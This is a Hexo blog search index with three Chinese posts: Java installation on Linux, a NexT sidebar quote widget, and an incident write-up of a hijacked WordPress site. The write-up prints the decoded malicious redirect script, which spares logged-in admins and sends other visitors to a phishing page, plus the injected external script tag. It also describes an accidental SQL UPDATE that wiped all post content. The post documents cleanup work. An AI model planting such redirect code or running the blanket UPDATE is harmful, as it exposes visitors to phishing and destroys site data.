<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Linux下安装Java环境</title>
    <url>/37b6e877/</url>
    <content><![CDATA[<h2 id="Ubuntu"><a href="#Ubuntu" class="headerlink" title="Ubuntu"></a>Ubuntu</h2><h3 id="搜索包"><a href="#搜索包" class="headerlink" title="搜索包"></a>搜索包</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt update &amp;&amp; apt search openjdk</span><br></pre></td></tr></table></figure>

<h3 id="安装所需版本"><a href="#安装所需版本" class="headerlink" title="安装所需版本"></a>安装所需版本</h3><blockquote>
<p>这里安装的是<code>Java17</code>无头版本, 有更少的依赖性和更少的系统资源占用, 较适合服务器使用.</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt install -y openjdk-17-jre-headless</span><br><span class="line">apt install -y openjdk-11-jre-headless</span><br></pre></td></tr></table></figure>

<h3 id="查看安装位置"><a href="#查看安装位置" class="headerlink" title="查看安装位置"></a>查看安装位置</h3><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">tree -L <span class="number">1</span> <span class="regexp">/usr/</span>lib/jvm</span><br></pre></td></tr></table></figure>

<figure class="highlight subunit"><table><tr><td class="code"><pre><span class="line">/usr/lib/jvm</span><br><span class="line">├── java<span class="string">-1</span>.11.0-openjdk-amd64 -&gt; java<span class="string">-11</span>-openjdk-amd64</span><br><span class="line">├── java<span class="string">-1</span>.17.0-openjdk-amd64 -&gt; java<span class="string">-17</span>-openjdk-amd64</span><br><span class="line">├── java<span class="string">-11</span>-openjdk-amd64</span><br><span class="line">└── java<span class="string">-17</span>-openjdk-amd64</span><br></pre></td></tr></table></figure>

<h3 id="切换默认版本"><a href="#切换默认版本" class="headerlink" title="切换默认版本"></a>切换默认版本</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">update</span><span class="operator">-</span>alternatives <span class="comment">--config java</span></span><br><span class="line"><span class="keyword">update</span><span class="operator">-</span>alternatives <span class="comment">--config javac</span></span><br></pre></td></tr></table></figure>

<h2 id="ArchLinux"><a href="#ArchLinux" class="headerlink" title="ArchLinux"></a>ArchLinux</h2><h3 id="搜索包-1"><a href="#搜索包-1" class="headerlink" title="搜索包"></a>搜索包</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pacman -Syu</span><br><span class="line">pacman -Ss openjdk</span><br></pre></td></tr></table></figure>

<h3 id="安装所需版本-1"><a href="#安装所需版本-1" class="headerlink" title="安装所需版本"></a>安装所需版本</h3><figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">pacman -Sy <span class="keyword">jre17-openjdk-headless</span></span><br><span class="line"><span class="keyword"></span>pacman -Sy <span class="keyword">jre8-openjdk-headless</span></span><br></pre></td></tr></table></figure>

<h3 id="切换版本"><a href="#切换版本" class="headerlink" title="切换版本"></a>切换版本</h3><p>查看已安装Java环境和当前默认使用</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">archlinux-java status</span></span><br></pre></td></tr></table></figure>

<p>切换对应Java版本</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo archlinux-java <span class="built_in">set</span> java-8-openjdk/jre</span><br></pre></td></tr></table></figure>

<p><img data-src="http://img.owq.world/2022/09/0131-3aad7c.png"></p>
<h2 id="CentOS"><a href="#CentOS" class="headerlink" title="CentOS"></a>CentOS</h2><h3 id="搜索包-2"><a href="#搜索包-2" class="headerlink" title="搜索包"></a>搜索包</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum update</span><br><span class="line">yum list *openjdk*</span><br></pre></td></tr></table></figure>

<h3 id="安装所需版本-2"><a href="#安装所需版本-2" class="headerlink" title="安装所需版本"></a>安装所需版本</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum install -y java-17-openjdk-headless.x86_64</span><br><span class="line">yum install -y java-1.8.0-openjdk-headless.x86_64</span><br></pre></td></tr></table></figure>

<h3 id="切换版本-1"><a href="#切换版本-1" class="headerlink" title="切换版本"></a>切换版本</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">alternatives --config java</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>学习教程</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>Liunx</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo NexT主题侧边栏添加一言</title>
    <url>/5313cb7/</url>
    <content><![CDATA[<h2 id="大致流程"><a href="#大致流程" class="headerlink" title="大致流程"></a>大致流程</h2><figure class="highlight clean"><table><tr><td class="code"><pre><span class="line">添加侧边栏 -&gt; 添加CSS -&gt; 激活配置 -&gt; 同步完工</span><br></pre></td></tr></table></figure>

<h2 id="演示效果"><a href="#演示效果" class="headerlink" title="演示效果"></a>演示效果</h2><img data-src="https://img.owq.world/2022/08/1356-4d4251.gif" style="zoom:80%;" />

<h2 id="添加一言插件"><a href="#添加一言插件" class="headerlink" title="添加一言插件"></a>添加一言插件</h2><p>编辑<code>themes/next/layout/_custom/sidebar.swig</code>文件, 若无则创建.</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- hitokoto --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">strong</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;hitokoto_wrap&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;hitokoto_text&quot;</span>&gt;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span>抬头望天，低头走路。<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;hitokoto_from&quot;</span>&gt;</span>——无名<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">strong</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">let</span> hitokoto_wrap = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;hitokoto_wrap&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">let</span> hitokoto_text = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;hitokoto_text&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">let</span> hitokoto_from = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;hitokoto_from&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">loadHitokoto</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// Fetch API</span></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 调用一言接口 根据需求配置参数 默认即可</span></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// fetch(&#x27;https://v1.hitokoto.cn?min_length=12&#x27;)</span></span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">fetch</span>(<span class="string">&#x27;https://international.v1.hitokoto.cn?min_length=12&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">        .<span class="title function_">then</span>(<span class="function"><span class="params">response</span> =&gt;</span> response.<span class="title function_">json</span>())</span></span><br><span class="line"><span class="language-javascript">        .<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">            hitokoto_text.<span class="property">innerText</span> = <span class="string">&#x27;\xa0\xa0\xa0\xa0\xa0\xa0\xa0&#x27;</span> + data.<span class="property">hitokoto</span>;</span></span><br><span class="line"><span class="language-javascript">            hitokoto_from.<span class="property">innerText</span> = <span class="string">&quot;——&quot;</span> + data.<span class="property">from</span> + <span class="string">&#x27;\xa0&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">        &#125;)</span></span><br><span class="line"><span class="language-javascript">        .<span class="title function_">catch</span>(<span class="variable language_">console</span>.<span class="property">error</span>)</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">loadHitokoto</span>();</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    hitokoto_wrap.<span class="title function_">addEventListener</span>(<span class="string">&quot;click&quot;</span>, <span class="keyword">async</span> <span class="keyword">function</span>(<span class="params">e</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">loadHitokoto</span>();</span></span><br><span class="line"><span class="language-javascript">        </span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 复制一言内容到剪贴板</span></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 去除字符串前后空格</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">let</span> content = (hitokoto_text.<span class="property">innerText</span> + hitokoto_from.<span class="property">innerText</span>).<span class="title function_">trim</span>()</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// Clipboard API</span></span></span><br><span class="line"><span class="language-javascript">        navigator.<span class="property">clipboard</span>.<span class="title function_">writeText</span>(content)</span></span><br><span class="line"><span class="language-javascript">        .<span class="title function_">then</span>(<span class="variable language_">console</span>.<span class="title function_">log</span>(content))</span></span><br><span class="line"><span class="language-javascript">        .<span class="title function_">catch</span>(<span class="variable language_">console</span>.<span class="property">error</span>)</span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="添加点击爱心特效"><a href="#添加点击爱心特效" class="headerlink" title="添加点击爱心特效"></a>添加点击爱心特效</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="comment">// 添加鼠标点击爱心特效</span></span></span><br><span class="line"><span class="language-javascript">    !<span class="keyword">function</span>(<span class="params">e, t, a</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">r</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">for</span> (<span class="keyword">var</span> e = <span class="number">0</span>; e &lt; s.<span class="property">length</span>; e++) s[e].<span class="property">alpha</span> &lt;= <span class="number">0</span> ? (t.<span class="property">body</span>.<span class="title function_">removeChild</span>(s[e].<span class="property">el</span>), s.<span class="title function_">splice</span>(e, <span class="number">1</span>)) : (s[e].<span class="property">y</span>--, s[e].<span class="property">scale</span> += <span class="number">.004</span>, s[e].<span class="property">alpha</span> -= <span class="number">.013</span>, s[e].<span class="property">el</span>.<span class="property">style</span>.<span class="property">cssText</span> = <span class="string">&quot;left:&quot;</span> + s[e].<span class="property">x</span> + <span class="string">&quot;px;top:&quot;</span> + s[e].<span class="property">y</span> + <span class="string">&quot;px;opacity:&quot;</span> + s[e].<span class="property">alpha</span> + <span class="string">&quot;;transform:scale(&quot;</span> + s[e].<span class="property">scale</span> + <span class="string">&quot;,&quot;</span> + s[e].<span class="property">scale</span> + <span class="string">&quot;) rotate(45deg);background:&quot;</span> + s[e].<span class="property">color</span> + <span class="string">&quot;;z-index:99999&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">requestAnimationFrame</span>(r)</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">n</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> t = <span class="string">&quot;function&quot;</span> == <span class="keyword">typeof</span> e.<span class="property">onclick</span> &amp;&amp; e.<span class="property">onclick</span>;</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// 绑定点击事件到一言窗口</span></span></span><br><span class="line"><span class="language-javascript">            hitokoto_wrap.<span class="title function_">addEventListener</span>(<span class="string">&quot;click&quot;</span>, <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                t &amp;&amp; <span class="title function_">t</span>(),</span></span><br><span class="line"><span class="language-javascript">                    <span class="title function_">o</span>(e)</span></span><br><span class="line"><span class="language-javascript">            &#125;);</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">c</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">return</span> <span class="string">&quot;rgb(&quot;</span> + ~~ (<span class="number">255</span> * <span class="title class_">Math</span>.<span class="title function_">random</span>()) + <span class="string">&quot;,&quot;</span> + ~~ (<span class="number">255</span> * <span class="title class_">Math</span>.<span class="title function_">random</span>()) + <span class="string">&quot;,&quot;</span> + ~~ (<span class="number">255</span> * <span class="title class_">Math</span>.<span class="title function_">random</span>()) + <span class="string">&quot;)&quot;</span></span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">o</span>(<span class="params">e</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> a = t.<span class="title function_">createElement</span>(<span class="string">&quot;div&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">            a.<span class="property">className</span> = <span class="string">&quot;heart&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">                s.<span class="title function_">push</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="attr">el</span>: a,</span></span><br><span class="line"><span class="language-javascript">                    <span class="attr">x</span>: e.<span class="property">clientX</span> - <span class="number">5</span>,</span></span><br><span class="line"><span class="language-javascript">                    <span class="attr">y</span>: e.<span class="property">clientY</span> - <span class="number">5</span>,</span></span><br><span class="line"><span class="language-javascript">                    <span class="attr">scale</span>: <span class="number">1</span>,</span></span><br><span class="line"><span class="language-javascript">                    <span class="attr">alpha</span>: <span class="number">1</span>,</span></span><br><span class="line"><span class="language-javascript">                    <span class="attr">color</span>: <span class="title function_">c</span>()</span></span><br><span class="line"><span class="language-javascript">                &#125;),</span></span><br><span class="line"><span class="language-javascript">                t.<span class="property">body</span>.<span class="title function_">appendChild</span>(a)</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">i</span>(<span class="params">e</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> a = t.<span class="title function_">createElement</span>(<span class="string">&quot;style&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">            a.<span class="property">type</span> = <span class="string">&quot;text/css&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">try</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                a.<span class="title function_">appendChild</span>(t.<span class="title function_">createTextNode</span>(e))</span></span><br><span class="line"><span class="language-javascript">            &#125; <span class="keyword">catch</span>(t) &#123;</span></span><br><span class="line"><span class="language-javascript">                a.<span class="property">styleSheet</span>.<span class="property">cssText</span> = e</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">            t.<span class="title function_">getElementsByTagName</span>(<span class="string">&quot;head&quot;</span>)[<span class="number">0</span>].<span class="title function_">appendChild</span>(a)</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> s = [];</span></span><br><span class="line"><span class="language-javascript">        e.<span class="property">requestAnimationFrame</span> = e.<span class="property">requestAnimationFrame</span> || e.<span class="property">webkitRequestAnimationFrame</span> || e.<span class="property">mozRequestAnimationFrame</span> || e.<span class="property">oRequestAnimationFrame</span> || e.<span class="property">msRequestAnimationFrame</span> ||</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="built_in">setTimeout</span>(e, <span class="number">1e3</span> / <span class="number">60</span>)</span></span><br><span class="line"><span class="language-javascript">            &#125;,</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">i</span>(<span class="string">&quot;.heart&#123;width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);&#125;.heart:after,.heart:before&#123;content: &#x27;&#x27;;width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: fixed;&#125;.heart:after&#123;top: -5px;&#125;.heart:before&#123;left: -5px;&#125;&quot;</span>),</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">n</span>(),</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">r</span>()</span></span><br><span class="line"><span class="language-javascript">    &#125; (<span class="variable language_">window</span>, <span class="variable language_">document</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="激活一言窗口"><a href="#激活一言窗口" class="headerlink" title="激活一言窗口"></a>激活一言窗口</h2><p>编辑<code>themes/next/_config.yml</code>文件</p>
<p>找到<code>custom_file_path</code>修改<code>sidebar</code>为<code>themes/next/layout/_custom/sidebar.swig</code>, 才会加载定制的侧边栏内容.</p>
<p><img data-src="http://img.owq.world/2022/08/1341-e8a05e.png"></p>
<h2 id="添加一言CSS"><a href="#添加一言CSS" class="headerlink" title="添加一言CSS"></a>添加一言CSS</h2><p>编辑<code>themes/next/source/css/_custom/custom.styl</code>文件</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">//hitokoto</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#hitokoto_wrap</span> &#123;</span><br><span class="line">  <span class="attribute">margin-top</span>: <span class="number">15px</span>;</span><br><span class="line">  <span class="attribute">cursor</span>: pointer;</span><br><span class="line">  <span class="attribute">display</span>: flex;</span><br><span class="line">  <span class="attribute">flex-direction</span>: column;</span><br><span class="line">  <span class="attribute">flex-wrap</span>: nowrap;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#hitokoto_text</span> &#123;</span><br><span class="line">  <span class="attribute">text-align</span>: left;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">0.8125em</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#hitokoto_from</span> &#123;</span><br><span class="line">  <span class="attribute">text-align</span>: right;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">0.7em</span>;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#999</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="导入一言CSS"><a href="#导入一言CSS" class="headerlink" title="导入一言CSS"></a>导入一言CSS</h2><p>编辑<code>themes/next/source/css/main.styl</code>文件</p>
<p>在末尾添加<code>@import &quot;_custom/custom&quot;;</code>, 这样css才会生效.</p>
<p><img data-src="http://img.owq.world/2022/08/1359-e8a23d.png"></p>
<hr>
<blockquote>
<p>测试效果 -&gt; 同步配置 -&gt; 大功告成🎉</p>
</blockquote>
<h2 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h2><blockquote>
<p><span class="exturl" data-url="aHR0cHM6Ly9kZXZlbG9wZXIuaGl0b2tvdG8uY24vc2VudGVuY2UvIyVFNyVBRSU4MCVFNCVCQiU4Qg==">语句接口 | 一言开发者中心 (hitokoto.cn)</span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmJpbGwubW9lL2FkZC1oaXRva290by8=">为您的Hexo博客添加Hitokoto一言功能 | Bill Yang&#39;s Blog</span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9qdWVqaW4uY24vcG9zdC82OTQ3OTc4MDgxMjYwNzk3OTg5">JS实现鼠标点击爱心&amp;绘制多边形&amp;每日一言功能 - 掘金 (juejin.cn)</span></p>
</blockquote>
]]></content>
      <categories>
        <category>博客定制</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>WordPress 站点恶意重定向解决记录</title>
    <url>/43259a0f/</url>
    <content><![CDATA[<blockquote>
<p>事情起因是这样的, 公司的网站被劫持了, 在前端解决问题后又复发后, 事情就落到这位幸运儿身上了~</p>
</blockquote>
<h2 id="劫持流程"><a href="#劫持流程" class="headerlink" title="劫持流程"></a>劫持流程</h2><blockquote>
<p>先看看被黑是什么样子的.</p>
</blockquote>
<p>打开网站会重定向到钓鱼页面, 然后提示你点击&quot;允许通知&quot;, 如果在这里点击&quot;Allow&quot;的话, 猜测则会通过系统的消息通知来进行&quot;攻击&quot;.<br><img data-src="http://img.owq.world/2022/06/1617-775e43.png"></p>
<blockquote>
<p>最为有趣的是, 这个钓鱼页面很&quot;聪明&quot;, 如果等一段时间(大概几秒)没有见你点击&quot;Allow&quot;后, 会随机跳转到另外一个钓鱼页面.</p>
</blockquote>
<p>像下图这样的, 直接告诉你可以解决刚刚出现的莫名弹窗(笑), 别说, 如果是个电脑小白还真会上钩, 毕竟, 这过程很&quot;合理&quot;.</p>
<p><img data-src="http://img.owq.world/2022/06/1100-be149e.png"></p>
<p>这是随机跳到的另一个钓鱼页面, 也是同样的套路.</p>
<p><img data-src="http://img.owq.world/2022/06/1100-76eb4c.png"></p>
<h2 id="定位问题原因"><a href="#定位问题原因" class="headerlink" title="定位问题原因"></a>定位问题原因</h2><ol>
<li><p>这个很明显是网站被劫持了, 那么第一步要确认是怎么被劫持了? 是DNS劫持还是网站被黑了?</p>
</li>
<li><p>未分析上面的钓鱼流程前, 从初步信息判断--&quot;我们自己打开网站不会被跳转, 但是在国外友人打开网站会被跳转&quot;, 先排除正确答案(网站被黑).</p>
<ol>
<li><p>那DNS被劫持, 这个有可能吗?</p>
<p>这里有一个细节, 钓鱼页面是网站打开后才跳转到钓鱼页面, 这个是DNS劫持不能做到的.</p>
<p>很可惜, 这个细节被忽略掉了, 所有有了接下来判断是否因为DNS被污染的操作.</p>
<ul>
<li><p>让国外友人用手机网络去浏览页面, 看看是否能正常访问, 排除区域网被劫持的可能.</p>
</li>
<li><p>还是不能正常访问, 这里就极大可能排除是DNS污染的问题, 运营商的DNS服务都被黑掉的概率太低了.</p>
</li>
</ul>
</li>
<li><p>那么回到网络被黑的可能去, 这里有个疑问, 为什么我们访问网站不会被跳转, 这个是和所处的网络有关吗?<br>一开始也很疑惑, 但后来公司有人访问页面也被跳转后, 我才发现忽略了一个很重要的东西--缓存.</p>
</li>
</ol>
</li>
<li><p>答案确认了--网站被黑, 那接下来正式解决问题.</p>
</li>
</ol>
<h2 id="定位恶意代码"><a href="#定位恶意代码" class="headerlink" title="定位恶意代码"></a>定位恶意代码</h2><blockquote>
<p>捡起老本行(逆向), 分析一波网络请求先, 很轻松的就找到恶意代码.</p>
</blockquote>
<p>首先, 搜索一开始跳转的域名, 找到该请求, 并没有得到有价值的信息, 我们需要找到发起该请求的地方.</p>
<p><img data-src="http://img.owq.world/2022/06/1101-32167f.png"></p>
<p>这时观察一下网络条, 发现有个地方存在异常, 请求了其它域名, 因为网站只连接了一个域名, 正常情况下应该是只有一条线.</p>
<p><img data-src="http://img.owq.world/2022/06/1100-a0d616.png"></p>
<p>让我们选中这个异常的网络块, 跳到发起的请求看看.</p>
<p><img data-src="http://img.owq.world/2022/06/1117-719ccf.png"></p>
<p>点开里面的内容一看, 果不其然, 这一段天书般的代码, 就是我们要找的东西了.</p>
<p><img data-src="http://img.owq.world/2022/06/1116-1922b9.png"></p>
<hr>
<blockquote>
<p>这一段是复盘的时候加上去的.</p>
</blockquote>
<p>这里手动翻译了下, 是一段重定向代码, 顺便搜索了下里面出现最多的<code>wordpress_p_seo_adminos</code>, 推测跟<code>p_seo_adminos</code>这个WP插件有关.</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">setCookie</span>(<span class="params">e,t,o</span>)&#123;<span class="keyword">var</span> n=<span class="string">&quot;&quot;</span>;<span class="keyword">if</span>(o)&#123;<span class="keyword">var</span> i=<span class="keyword">new</span> <span class="title class_">Date</span>;i.<span class="title function_">setTime</span>(i.<span class="title function_">getTime</span>()+<span class="number">24</span>*o*<span class="number">60</span>*<span class="number">60</span>*<span class="number">1e3</span>),n=<span class="string">&quot;; expires=&quot;</span>+i.<span class="title function_">toUTCString</span>()&#125;<span class="variable language_">document</span>.<span class="property">cookie</span>=e+<span class="string">&quot;=&quot;</span>+(t||<span class="string">&quot;&quot;</span>)+n+<span class="string">&quot;; path=/&quot;</span>&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getCookie</span>(<span class="params">e</span>)&#123;<span class="keyword">for</span>(<span class="keyword">var</span> t=e+<span class="string">&quot;=&quot;</span>,o=<span class="variable language_">document</span>.<span class="property">cookie</span>.<span class="title function_">split</span>(<span class="string">&quot;;&quot;</span>),n=<span class="number">0</span>;n&lt;o.<span class="property">length</span>;n++)&#123;<span class="keyword">for</span>(<span class="keyword">var</span> i=o[n];<span class="string">&quot; &quot;</span>==i.<span class="title function_">charAt</span>(<span class="number">0</span>);)i=i.<span class="title function_">substring</span>(<span class="number">1</span>,i.<span class="property">length</span>);<span class="keyword">if</span>(<span class="number">0</span>==i.<span class="title function_">indexOf</span>(t))<span class="keyword">return</span> i.<span class="title function_">substring</span>(t.<span class="property">length</span>,i.<span class="property">length</span>)&#125;<span class="keyword">return</span> <span class="literal">null</span>&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getLoggedInCookie</span>(<span class="params"></span>)&#123;<span class="keyword">return</span> <span class="variable language_">document</span>.<span class="property">cookie</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;wp-settings-time&quot;</span>)&gt;-<span class="number">1</span>?<span class="number">1</span>:<span class="variable language_">document</span>.<span class="property">cookie</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;logged_in&quot;</span>)&gt;-<span class="number">1</span>?<span class="number">1</span>:<span class="variable language_">document</span>.<span class="property">cookie</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;wpsetts-cookie&quot;</span>)&gt;-<span class="number">1</span>?<span class="number">1</span>:<span class="variable language_">document</span>.<span class="property">cookie</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;wordpress_p_seo_adminos&quot;</span>)&gt;-<span class="number">1</span>?<span class="number">1</span>:<span class="number">0</span>&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">goaweway</span>(<span class="params"></span>)&#123;<span class="keyword">var</span> newv = <span class="string">&#x27;https://front.greengoplatform.com/go.php?lid=3337&amp;pid=9646&amp;cid=114733&#x27;</span>;<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=newv;<span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>=newv;&#125;<span class="keyword">if</span>(<span class="title function_">getLoggedInCookie</span>()==<span class="number">1</span>)&#123;<span class="title function_">setCookie</span>(<span class="string">&quot;wordpress_p_seo_adminos&quot;</span>,<span class="number">1</span>,<span class="number">30</span>);&#125;<span class="keyword">else</span>&#123;<span class="title function_">goaweway</span>();&#125;</span><br></pre></td></tr></table></figure>

<hr>
<p>接下来该怎么办? 毕竟咱对<code>WordPress</code>并不是很熟悉, 所以借助下搜索引擎的力量, 找到了这篇文章.</p>
<blockquote>
<p><span class="exturl" data-url="aHR0cHM6Ly9yZW1vdGVyZXNjdWUubmV0L3dvcmRwcmVzcy1yZWRpcmVjdGluZy10by1sZWdlbmRhcnl0YWJsZS1jb20v">How to remove legendarytable.com redirect malware - Remote Rescue</span></p>
</blockquote>
<p>这篇文章刚好也是网站被劫持的那段时间发出的, 确认是同一种情况后, 咱根据文章教程进行解决就行.</p>
<h2 id="处理恶意插件"><a href="#处理恶意插件" class="headerlink" title="处理恶意插件"></a>处理恶意插件</h2><blockquote>
<p>这里通过关键字搜索恶意插件名无果后, 直接把网站上看起来的&quot;奇奇怪怪&quot;插件都给清了, 后面也没有复发, 简单又省事~</p>
</blockquote>
<h2 id="清除恶意代码"><a href="#清除恶意代码" class="headerlink" title="清除恶意代码"></a>清除恶意代码</h2><p>顺藤摸瓜, 找到DB.<code>wp_posts</code>里的恶意代码, 这里使用<code>phpMyAdmin</code>去连接(通过WP插件).</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script type=’text/javascript’ src=’<span class="attr">https</span>:<span class="comment">//trend.linetoadsactive.com/m.js?n=ns1′&gt;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>

<p><img data-src="http://img.owq.world/2022/06/1125-160779.png"></p>
<p>然而, 在时间急迫的情况下(还有其它事情要做), 以及翻了好几页都是相同内容的误导中, 直接使用<code>UPDATE wp_posts SET post_content = &quot;&quot;</code>语句(真是个大聪明).<br>结果, <code>post_content</code> 被清空了, 页面内容被清空...</p>
<h2 id="回滚数据"><a href="#回滚数据" class="headerlink" title="回滚数据"></a>回滚数据</h2><blockquote>
<p>参考文章: <span class="exturl" data-url="aHR0cHM6Ly93d3cucGNoNTIwLmNvbS9hcnRpY2xlLzM2">https://www.pch520.com/article/36</span></p>
</blockquote>
<ul>
<li><p>先查看<code>binlog</code>日志开了没, <code>log_bin=ON</code></p>
